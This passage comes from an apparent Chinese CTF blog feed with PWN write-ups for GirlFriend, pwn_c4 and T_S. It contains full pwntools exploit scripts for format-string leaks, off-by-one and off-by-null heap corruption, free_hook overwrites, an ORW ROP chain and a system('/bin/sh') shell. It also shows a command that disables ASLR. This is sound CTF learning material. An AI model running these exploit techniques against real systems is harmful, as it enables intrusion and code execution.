class="hljs-comment">#0</span><br><br>add(<span class="hljs-number">0x100</span>)  <span class="hljs-comment">#1</span><br>free(<span class="hljs-number">1</span>)<br>edit(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br>free(<span class="hljs-number">1</span>)<br>show(<span class="hljs-number">1</span>)<br>heap_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) &amp; <span class="hljs-number">0xfffffffff000</span><br>success(<span class="hljs-string">&#x27;heap_base -&gt; &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(heap_base)))<br>edit(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    free(<span class="hljs-number">1</span>)<br>    edit(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br><br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>libc_base = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x70</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>success(<span class="hljs-string">&#x27;libc_base -&gt; &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(libc_base)))<br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>malloc_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>realloc = libc_base + libc.sym[<span class="hljs-string">&#x27;__libc_realloc&#x27;</span>]<br>rtld_global = libc_base + <span class="hljs-number">0x237f68</span><br>golbal_max_fast = libc_base + <span class="hljs-number">0x1eeb80</span><br>gadget = [<span class="hljs-number">0xe6c7e</span>, <span class="hljs-number">0xe6c81</span>, <span class="hljs-number">0xe6c84</span>]<br>one_gadget = libc_base + gadget[<span class="hljs-number">0</span>]<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>add(<span class="hljs-number">0x100</span>)  <span class="hljs-comment">#2</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):  <span class="hljs-comment">#3-8</span><br>    add(<span class="hljs-number">0x88</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):  <span class="hljs-comment">#3-8</span><br>    free(<span class="hljs-number">3</span>+i)<br><br>add(<span class="hljs-number">0x200</span>)          <span class="hljs-comment">#9</span><br>add(<span class="hljs-number">0x68</span>)           <span class="hljs-comment">#10</span><br>add(<span class="hljs-number">0x200</span>)          <span class="hljs-comment">#11</span><br>add(<span class="hljs-number">0x200</span>)          <span class="hljs-comment">#12</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    free(<span class="hljs-number">12</span>)<br>    edit(<span class="hljs-number">12</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br>free(<span class="hljs-number">9</span>)<br>add(<span class="hljs-number">0x170</span>)          <span class="hljs-comment">#13</span><br>free(<span class="hljs-number">11</span>)<br>add(<span class="hljs-number">0x170</span>)          <span class="hljs-comment">#14</span><br>add(<span class="hljs-number">0x200</span>)          <span class="hljs-comment">#15</span><br>edit(<span class="hljs-number">11</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x178</span> + p64(<span class="hljs-number">0x91</span>) + p64(heap_base+<span class="hljs-number">0x990</span>) + p64(golbal_max_fast-<span class="hljs-number">0x10</span>))<br>add(<span class="hljs-number">0x88</span>)           <span class="hljs-comment">#16</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    free(<span class="hljs-number">10</span>)<br>    edit(<span class="hljs-number">10</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x10</span>)<br>free(<span class="hljs-number">10</span>)<br>edit(<span class="hljs-number">10</span>, p64(malloc_hook-<span class="hljs-number">0x33</span>))<br>add(<span class="hljs-number">0x68</span>)           <span class="hljs-comment">#17</span><br>add(<span class="hljs-number">0x68</span>)           <span class="hljs-comment">#18</span><br>edit(<span class="hljs-number">18</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x1b</span> + p64(one_gadget) + p64(realloc))<br><span class="hljs-comment"># pause()</span><br>add(<span class="hljs-number">0x10</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="darkdark"><a href="#darkdark" class="headerlink" title="darkdark"></a>darkdark</h2><p>不会ret2dlresolve，使用pwntools的模板打了几发，应该是姿势不对，告辞！！！</p>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>orw</tag>
      
      <tag>Tcache Stashing Unlink Attack</tag>
      
      <tag>tcache struct劫持</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>广东省强网杯团队赛PWN方向题解</title>
    <link href="/2021/10/14/%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%9B%A2%E9%98%9F%E8%B5%9BPWN/"/>
    <url>/2021/10/14/%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%9B%A2%E9%98%9F%E8%B5%9BPWN/</url>
    
    <content type="html"><![CDATA[<p>比赛只出了一道pwn，摸了。<a href="https://pan.baidu.com/s/1Tn7DffidoxqQ3mqQtZntXQ">题目链接</a>，提取码：hi98</p><h2 id="GirlFriend"><a href="#GirlFriend" class="headerlink" title="GirlFriend"></a>GirlFriend</h2><h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><p>ida打开文件后发现函数体内啥也没有。</p><p><img src="https://i.loli.net/2021/10/14/PWj4pbmZrocFEOK.png"></p><p>汇编中有call $+5这样一条指令，类似于重定位，这对我们来说肯定是干扰，我们需要patch修复一下。</p><p><img src="https://i.loli.net/2021/10/14/lNi7AC2HdQOmRf9.png"></p><p>修复方法参考如下</p><p><img src="https://i.loli.net/2021/10/14/NtYoklu962zjMGw.png"></p><p>就是把call $+5全都改成<code>jmp</code> 【下条指令地址加上其偏移】，修复后就可以看见函数代码了，程序中有很多需要修复的地方，同样的方法改一下就好。</p><p><img src="https://i.loli.net/2021/10/14/ZgnxuRowFL3ypKr.png"></p><p>全都修复好就可以正式分析了，程序逻辑很简单，漏洞点主要有两处，格式化字符串和off by one，当然还有个隐藏的后门功能，可以泄露堆地址。</p><p><img src="https://i.loli.net/2021/10/14/sEaVH93Sz52jdpQ.png"></p><p><img src="https://i.loli.net/2021/10/14/MbOCHePpDTVtUkr.png"></p><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>我遇到的格式化字符串在堆题中大部分作用就是辅助泄露<code>libc</code>，同样这里我们也可以用来泄露<code>libc</code>。</p><p>程序开了沙箱，只能<code>orw</code>了，经典利用free_hook+setcontext来读取flag</p><h3 id="调试过程"><a href="#调试过程" class="headerlink" title="调试过程"></a>调试过程</h3><p><strong>libc泄露</strong></p><p>常规泄露的话就是用%p来打印栈中数据，还可以用<code>%7$p</code>指定参数位置，但程序开了<code>FORTIFY</code>防护，不能跳跃使用%N$这种格式的输入。也就是说如果要使用 <code>%3$p</code>，则必须同时使用 <code>%1$p</code> 和 <code>%2$p</code></p><p><img src="https://i.loli.net/2021/10/14/2sMq8DTk5z4Saob.png"></p><p>于是去搜索了一下printf_chk格式化字符串相关的利用方法，发现还有<code>%a</code>泄露libc的方法（第一次见）。</p><p>但他的输出格式有点特别，需要匹配一下再接收，下个断点gdb动态调一下就可以得到libc基址了。</p><p><img src="https://i.loli.net/2021/10/14/m6Dzep8NMEvKlBY.png"></p><p><strong>堆地址泄露</strong></p><p>这个直接调用程序中的后门函数即可</p><p><strong><code>offbyone</code>构造<code>overlap chunk</code></strong></p><p>主要时间花费在这部分，程序实际的功能只有一个，但这个功能是用<code>realloc</code>实现的，为什么不用<code>malloc</code>要用<code>realloc</code>，肯定有点猫腻。</p><p>他的基础功能是改变<code>mem_ptr</code>所指内存区域的大小为<code>new_size</code>长度。这里有几种不同的情况</p><ol><li>当size为0，这时就相当于free()函数，同时返回值为null</li><li>当指针为0，size大于0，相当于malloc函数</li><li>size小于等于原来的size，则在原先的基础上缩小，多余的free掉</li><li>size大于原来的size，如果有空间就原基础扩充，空间不足则分配新的内存，将内容复制到新的内存中，然后再将原来的内存free掉</li></ol><p><code>off by one</code>，常见的手法就是改堆块的size构造出堆块重叠了。</p><p>布局也不是很复杂，如下即可，通过编辑<code>chunk0</code>溢出到<code>chunk1</code>的size位，将<code>chunk1</code>的size改成<code>chunk1</code>+<code>chunk2</code>的size总和。为了方便起见，我是选择了让<code>chunk1</code>的size为<code>0x101</code>，<code>chunk2</code>的size为<code>0xAA</code>，这样的话，只需将<code>chunk1</code>的size低位字节改成<code>chunk2</code>的size大小即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x300</span>, <span class="hljs-string">&#x27;aaa&#x27;</span>)<br>add(<span class="hljs-number">0x230</span>, <span class="hljs-string">&#x27;aaa&#x27;</span>)<br>add(<span class="hljs-number">0x138</span>, <span class="hljs-string">&#x27;aaa&#x27;</span>)<br>re(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/14/R1k4vdliZqePLNM.png"></p><p><img src="https://i.loli.net/2021/10/14/gAr4td3YxjERH5q.png"></p><p>再申请一个<code>0x138</code>大小的chunk就可以拿到<code>chunk0</code>了，进而修改<code>chunk1</code>的size</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x138</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x138</span> + <span class="hljs-string">&#x27;\xd0&#x27;</span>)<br>re(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/14/EXNfeFn3oLibRJP.png"></p><p>这时候再把<code>chunk1</code>申请过来然后释放掉，<code>chunk1</code>就进入<code>0x1d0</code>的<code>tcache bin</code>里了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0xf0</span>, <span class="hljs-string">&#x27;bbb&#x27;</span>)<br>re(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/14/QT51Zur9KAocb4V.png"></p><p>那么接下来把这个<code>0x1d0</code>的<code>overlaped chunk</code>申请下来就可以修改<code>chunk2</code>的<code>fd</code>了</p><p>后面的操作也都是模板了，不多赘述</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>binary = <span class="hljs-string">&#x27;./girlfriend&#x27;</span><br>elf = ELF(binary)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><span class="hljs-comment"># libc = ELF(&#x27;./libc.so.6&#x27;)</span><br>local = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> local:<br>p = process(binary)<br><span class="hljs-keyword">else</span>:<br>p = remote(<span class="hljs-string">&#x27;123.60.63.90&#x27;</span>, <span class="hljs-number">49156</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size, content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br><span class="hljs-comment"># pause()</span><br>p.sendlineafter(<span class="hljs-string">&#x27;size\n&#x27;</span>, <span class="hljs-built_in">str</span>(size))<br>p.sendafter(<span class="hljs-string">&#x27;data\n&#x27;</span>, content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">re</span>(<span class="hljs-params">size</span>):</span><br>p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;size\n&#x27;</span>, <span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>():</span><br>p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exit</span>():</span><br>p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)<br>gdb.attach(p)<span class="hljs-comment">#, &#x27;b *$rebase(0xf1c)&#x27;)</span><br>p.sendlineafter(<span class="hljs-string">&#x27;? \n\n\n&#x27;</span>, <span class="hljs-string">&#x27;78&#x27;</span>)<br>p.sendafter(<span class="hljs-string">&#x27;reason\n&#x27;</span>, <span class="hljs-string">&#x27;%a&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;0x0.0&#x27;</span>)<br>libc_base = <span class="hljs-built_in">int</span>(p.recvline()[:<span class="hljs-number">12</span>], <span class="hljs-number">16</span>) - libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>] - <span class="hljs-number">131</span><br>success(<span class="hljs-string">&#x27;libc_base -&gt; &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(libc_base)))<br>setcontext = libc_base + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>] + <span class="hljs-number">0x35</span><br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>exit()<br><br>p.sendlineafter(<span class="hljs-string">&#x27;? \n\n\n&#x27;</span>, <span class="hljs-string">&#x27;89&#x27;</span>)<br>add(<span class="hljs-number">0x300</span>, <span class="hljs-string">&#x27;aaa&#x27;</span>)<br>show()<br>heap_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>success(<span class="hljs-string">&#x27;heap_base -&gt; &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(heap_base)))<br>flag_path = heap_base + <span class="hljs-number">0x1d8</span><br>add(<span class="hljs-number">0x230</span>, <span class="hljs-string">&#x27;aaa&#x27;</span>)<br>add(<span class="hljs-number">0x138</span>, <span class="hljs-string">&#x27;aaa&#x27;</span>)<br>re(<span class="hljs-number">0</span>)<br><br>add(<span class="hljs-number">0x138</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x138</span> + <span class="hljs-string">&#x27;\xd0&#x27;</span>)<br>re(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0xf0</span>, <span class="hljs-string">&#x27;bbb&#x27;</span>)<br>re(<span class="hljs-number">0</span>)<br><br>pop_rdi_ret = libc_base + <span class="hljs-number">0x215bf</span><br>pop_rsi_ret = libc_base + <span class="hljs-number">0x23eea</span><br>pop_rdx_ret = libc_base + <span class="hljs-number">0x1b96</span><br>pop_rax_ret = libc_base + <span class="hljs-number">0x43ae8</span><br>ret = libc_base + <span class="hljs-number">0x8aa</span><br>Read = libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>Write = libc_base + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>syscall = Read + <span class="hljs-number">15</span><br><br>orw = p64(pop_rdi_ret) + p64(flag_path)<br>orw += p64(pop_rsi_ret) + p64(<span class="hljs-number">0</span>)<br>orw += p64(pop_rax_ret) + p64(<span class="hljs-number">2</span>)<br>orw += p64(syscall)<br>orw += p64(pop_rdi_ret) + p64(<span class="hljs-number">3</span>)<br>orw += p64(pop_rsi_ret) + p64(flag_path)<br>orw += p64(pop_rdx_ret) + p64(<span class="hljs-number">0x41</span>)<br>orw += p64(Read)<br>orw += p64(pop_rdi_ret) + p64(<span class="hljs-number">1</span>)<br>orw += p64(Write)<br>payload = orw + <span class="hljs-string">&#x27;./flag&#x27;</span>.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span> + payload<br><br>add(<span class="hljs-number">0x1c0</span>, payload.ljust(<span class="hljs-number">0xf8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>) + p64(<span class="hljs-number">0xb1</span>) + p64(free_hook))<br>re(<span class="hljs-number">0</span>)<br><br>add(<span class="hljs-number">0xc0</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br>re(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0xc0</span>, p64(setcontext).ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">&#x27;a&#x27;</span>) + p64(heap_base+<span class="hljs-number">0x150</span>) + p64(ret))<br><span class="hljs-comment"># pause()</span><br>re(<span class="hljs-number">0</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="pwn-c4"><a href="#pwn-c4" class="headerlink" title="pwn_c4"></a>pwn_c4</h2><p>这个题ida一打开就有关掉的冲动，完全逆不动。但结合题目的描述：编辑器/uaf</p><p>猜测这个题实现了一个小型的C语言编译器，可以编译我们输入的C语言代码，同时可以从ida中看到如下的字符串，应该就是提示我们可以用以下关键字。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">buf = <span class="hljs-string">&quot;char else enum if int return sizeof while open read close printf malloc free memset memcmp exit void main&quot;</span>;<br></code></pre></td></tr></table></figure><p>google搜索pwn c4可以也可以搜到历史有相关的考点。</p><p><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/05/10/boom/">https://xuanxuanblingbling.github.io/ctf/pwn/2020/05/10/boom/</a></p><p><img src="https://i.loli.net/2021/10/14/IsLh2SNnEC7kK5F.png"></p><h3 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h3><p>通过执行C语言代码拿到程序shell</p><h3 id="调试过程-1"><a href="#调试过程-1" class="headerlink" title="调试过程"></a>调试过程</h3><p>先写个程序试试怎么用，经典<code>hello world!</code>，发现确实有输出。</p><p><img src="https://i.loli.net/2021/10/14/6XpFoTbgJ3VweSN.png"></p><p>再来个打印堆地址看看，我申请了一个块超级大的堆块，使用mmap系统调用，地址应该是跟libc接近，也同样可以打印出来，这也就验证了我们前面的猜想。</p><p><img src="https://i.loli.net/2021/10/14/xpZzTngEqSR6m75.png"></p><p>接下来就是写程序拿shell了，libc可以通过计算那个mmap出来的堆地址之间的偏移来获得，打远程的话就加载远程的使用的那个libc计算这个偏移。</p><p><img src="https://i.loli.net/2021/10/14/oMgAeNlhIBQ1rKR.png"></p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>binary = <span class="hljs-string">&#x27;./c4&#x27;</span><br>local = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> local:<br>p = process(binary)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>libc = ELF(libc-<span class="hljs-number">2.27</span>.so)<br>p = remote(<span class="hljs-string">&#x27;&#x27;</span>)<br>elf = ELF(binary)<br><br><span class="hljs-comment"># gdb.attach(p, &#x27;b exit&#x27;)</span><br>payload = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">void main()</span><br><span class="hljs-string">&#123;</span><br><span class="hljs-string">int libc_base, system, free_hook;</span><br><span class="hljs-string">libc_base = (int)malloc(0x21000) - 0x498010;</span><br><span class="hljs-string">printf(&quot;libc_base -&gt; %p&quot;, libc_base);</span><br><span class="hljs-string">system = libc_base + 0x4f550;</span><br><span class="hljs-string">free_hook = libc_base + 0x3ed8e8;</span><br><span class="hljs-string">*(int*)free_hook = system;</span><br><span class="hljs-string">free(&quot;/bin/sh&quot;);</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>p.send(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="T-S"><a href="#T-S" class="headerlink" title="T_S"></a>T_S</h2><p>比赛的时候就载在这里了，做题太心急了，没仔细观察，导致看了半天都没找到漏洞点在哪，这个题的edit函数也用重定位藏了一段代码，把<code>call $+5</code>修复一下就好。害，阴间出题人。</p><h3 id="程序分析-1"><a href="#程序分析-1" class="headerlink" title="程序分析"></a>程序分析</h3><p>修复后的的代码如下</p><p><img src="https://i.loli.net/2021/10/14/wFrHesgNYiGnD4t.png"></p><p>中间那个三层for循环也是个唬人的阴间操作，两两交换又还原，相当于啥也没干。重点是最后一个循环，遍历堆块的每一个字节，判断是否等于1，如果所有字节都等于1最后就有一个赋0操作，也就是<code>off by null</code>。撒花，直接套模板。</p><h3 id="利用思路-2"><a href="#利用思路-2" class="headerlink" title="利用思路"></a>利用思路</h3><p>利用off by null漏洞构造出overlap chunk，libc 2.29以上利用off by null需要绕过两个check，一个是向低地址合并的检测：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))<br>    malloc_printerr (<span class="hljs-string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);<br></code></pre></td></tr></table></figure><p>另一个是unlink的检测</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="hljs-number">0</span>))<br>    malloc_printerr (check_action, <span class="hljs-string">&quot;corrupted double-linked list&quot;</span>, P, AV);<br></code></pre></td></tr></table></figure><p>prevsize是我们控制的，很好伪造，重点是绕过unlink的检查，程序有show功能，可以直接泄露堆地址，也就很容易绕过unlink的检测构造出overlapped chunk。</p><p>有了重叠的堆块就可以很愉快的操作了，通过unsorted bin的地址踩出_IO_2_1_stdout进而泄露libc，再就是改free_hook了。</p><h3 id="调试过程-2"><a href="#调试过程-2" class="headerlink" title="调试过程"></a>调试过程</h3><p><strong>泄露堆地址</strong></p><p>申请两个同样大小的堆块，再free掉，形成单链表，申请一个回来再show一下就可以拿到堆地址了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#1</span><br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#0</span><br>show(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/14/z2oBig9vuIFfXCt.png"></p><p><strong>off by null</strong></p><p>堆块布局如下，三个连续的chunk，这里的0，1，2并不与后面的exp堆块编号对应，只是简化描述而已。</p><p><img src="https://i.loli.net/2021/10/14/o5tbqaeNPjhDWlu.png"></p><p>上述布局有几个注意点的，为了绕过第一个检测，我们需要让pre_size等于chunk_size，chunk的size我们不好实际控制，所以再chunk0中构造一个fake_chunk，让这个fake_chunk的fake_size等于<code>chunk0_size+chunk1_size-0x10</code>。为了绕过第二个检测，需要让fake_fd和fake_bk指向它自己。并且同过off by null漏洞把chunk2的prev_inuse位置为0。</p><p>这些操作完成了，再free chunk2的时候，glibc就会根据prev_size找到fake_chunk，再进行unlink脱链操作。</p><p>下面为exp的chunk编号，0，1用来泄露堆地址了，与上述编号有出入。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs pyton">add(0x100)  #2 工具堆块 伪造fake_chunk<br>add(0x78)   #3 工具堆块 用来修改chunk4的prev_size和触发off by null漏洞<br>add(0x4f0)  #4 工具堆块，为了让chunk进入unsorted bin<br>add(0x100)  #5 避免top_chunk合并<br>add(0x78)   #6 工具堆块 让tcahe bin链表的数量为正<br><br>edit(2, p64(0)+p64(0x100+0x81)+p64(heap_base+0x2e0)*2)<br>edit(3, &#x27;\x01&#x27;*0x78)<br>edit(3, b&#x27;a&#x27;*0x70 + p64(0x180))<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/14/eJlIE98AGwD1doa.png"></p><p>然后把chunk4给free掉，就触发合并了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">free(<span class="hljs-number">4</span>)<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/14/xS8QYkszZ3GMjIU.png"></p><p><strong>泄露libc</strong></p><p>通过切割unsorted bin，把unsorted bin的地址链到tcache上，爆破一位，把unsorted bin的地址改成__IO_2_1_stdout_的地址。</p><p>为了调试方便可以关掉本地的地址随机化<code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">free(<span class="hljs-number">6</span>)<br>free(<span class="hljs-number">3</span>)<br>add(<span class="hljs-number">0xf0</span>)   <span class="hljs-comment">#3</span><br>add(<span class="hljs-number">0x10</span>)   <span class="hljs-comment">#4</span><br>edit(<span class="hljs-number">4</span>, p16(<span 